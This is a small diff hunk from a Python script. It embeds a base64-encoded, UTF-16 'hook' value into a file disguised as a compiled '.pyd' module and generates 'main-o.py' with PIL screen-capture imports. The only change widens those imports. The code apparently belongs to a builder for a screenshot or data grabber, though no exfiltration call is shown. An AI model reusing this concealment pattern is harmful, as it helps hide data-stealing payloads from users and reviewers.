@@ -27,7 +27,7 @@ with open("ampl.pyd", "rb") as e:
 with open("structc.pyd", "wb") as e:
     e.write(con+base64.b64encode(hook.encode()).decode().encode('utf-16'))
 
-code = """from PIL import ImageGrab
+code = """from PIL import ImageGrab, Image, ImageStat
 """ + code
 
 with open('main-o.py', 'w') as file:
